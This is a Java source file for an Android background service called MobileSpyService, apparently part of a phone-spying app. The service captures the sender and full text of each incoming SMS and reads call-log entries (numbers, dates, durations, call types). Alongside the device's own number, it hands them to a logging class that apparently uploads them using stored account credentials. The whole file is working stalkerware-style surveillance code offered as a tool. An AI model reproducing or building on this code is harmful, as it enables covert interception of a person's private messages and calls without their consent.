package org.ddth.android.mobilespy;

import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import org.ddth.http.core.Logger;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsMessage;
import android.text.format.DateUtils;

public class MobileSpyService extends Service {

	private static final int LOG_TIME_FORMAT = DateUtils.FORMAT_SHOW_TIME | DateUtils.FORMAT_24HOUR;
	private static final int LOG_DATE_FORMAT = DateUtils.FORMAT_SHOW_DATE | DateUtils.FORMAT_SHOW_YEAR | DateUtils.FORMAT_ABBREV_MONTH;
	
	public static final String EXTRA_EVENT_TYPE = "mobilespy.event.type";
	public static final int EVENT_TYPE_SMS = 0;
	public static final int EVENT_TYPE_CALL = 1;
	
	private String phoneNumber;
	private Timer timer;

	@Override
	public void onCreate() {
		super.onCreate();
		TelephonyManager telephony = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		phoneNumber = telephony.getLine1Number();
		timer = new Timer();
		SharedPreferences settings = getSharedPreferences(MobileSpy.APPLICATION_TAG, MODE_PRIVATE);
		MobileSpy.setCredentials(
				settings.getString(MobileSpy.USERNAME_FIELD, ""),
				settings.getString(MobileSpy.PASSWORD_FIELD, ""));
	}
	
	@Override
	public void onStart(final Intent intent, int startId) {
		super.onStart(intent, startId);
		// Delay processing a little bit in order to make
		// sure data is fully available for accessing.
		timer.schedule(new TimerTask() {
			@Override
			public void run() {
				onHandleIntent(intent);
			}
		}, 500);
	}
	
	protected void onHandleIntent(Intent intent) {
		int eventType = intent.getExtras().getInt(EXTRA_EVENT_TYPE);
		switch (eventType) {
		case EVENT_TYPE_SMS:
			logSMS(intent);
			break;
			
		case EVENT_TYPE_CALL:
			logCall(this);
			break;
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	private void logCall(Context context) {
		Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DEFAULT_SORT_ORDER); 
		
		int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
		int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);
		int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
		int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);

		if (!cursor.moveToFirst()) {
			cursor.close();
			return;
		}
		
		String number = cursor.getString(numberColumn);
		String date = DateUtils.formatDateTime(context, cursor.getLong(dateColumn), LOG_DATE_FORMAT);
		String time = DateUtils.formatDateTime(context, cursor.getLong(dateColumn), LOG_TIME_FORMAT);
		String duration = cursor.getString(durationColumn);
		int type = cursor.getInt(typeColumn);
		
		String from = number, to = phoneNumber;
		String callType = "";
		switch (type) {
		case CallLog.Calls.INCOMING_TYPE:
			callType = MobileSpy.CALL_TYPE_INCOMING;
			break;
			
		case CallLog.Calls.OUTGOING_TYPE:
			from = phoneNumber;
			to = number;
			callType = MobileSpy.CALL_TYPE_OUTGOING;
			break;
			
		case CallLog.Calls.MISSED_TYPE:
			callType = MobileSpy.CALL_TYPE_MISSEDCALL;
			break;
		}
		MobileSpy.logCall(date, time, from, to, duration, callType);
	}
	
	private void logSMS(Intent intent) {
		SmsMessage msg[] = getMessagesFromIntent(intent);
		for (int i = 0; i < msg.length; i++) {
			String message = msg[i].getDisplayMessageBody();
			if (message != null && message.length() > 0) {
				String from = msg[i].getOriginatingAddress();
				String to = "0";
				long now = new Date().getTime();
				String date = DateUtils.formatDateTime(this, now, LOG_DATE_FORMAT);
				String time = DateUtils.formatDateTime(this, now, LOG_TIME_FORMAT);
				MobileSpy.logSMS(date, time, from, to, message);				
			}
		}	
	}

	private SmsMessage[] getMessagesFromIntent(Intent intent) {
		SmsMessage msgs[] = null;
		Bundle bundle = intent.getExtras();
		try {
			Object pdus[] = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for (int n = 0; n < pdus.length; n++) {
				byte[] byteData = (byte[]) pdus[n];
				msgs[n] = SmsMessage.createFromPdu(byteData);
			}
		}
		catch (Exception e) {
			Logger.getDefault().error("Fail", e);
		}
		return msgs;
	}
}
